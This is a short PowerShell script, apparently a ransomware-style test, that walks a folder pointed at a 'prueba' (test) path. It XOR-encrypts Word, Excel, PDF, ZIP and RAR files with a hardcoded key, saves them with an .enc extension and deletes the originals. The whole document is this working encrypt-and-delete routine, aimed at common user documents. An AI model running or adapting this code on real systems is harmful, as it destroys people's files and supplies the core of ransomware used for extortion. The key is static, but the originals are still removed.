$clave = "MiClaveSecreta123"
$claveBytes = [System.Text.Encoding]::ASCII.GetBytes($clave)
$carpeta = "C:\gemini-pro\encriptar\prueba"
$extensiones = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.zip", "*.rar")

foreach ($ext in $extensiones) {
    Get-ChildItem -Path $carpeta -Filter $ext | ForEach-Object {
        Write-Host "Encriptando: $($_.Name)"
        $datos = [System.IO.File]::ReadAllBytes($_.FullName)
        
        for ($i = 0; $i -lt $datos.Length; $i++) {
            $datos[$i] = $datos[$i] -bxor $claveBytes[$i % $claveBytes.Length]
        }
        
        [System.IO.File]::WriteAllBytes($($_.FullName + ".enc"), $datos)
        Remove-Item $_.FullName
        Write-Host "Finalizado: $($_.Name).enc"
    }
}
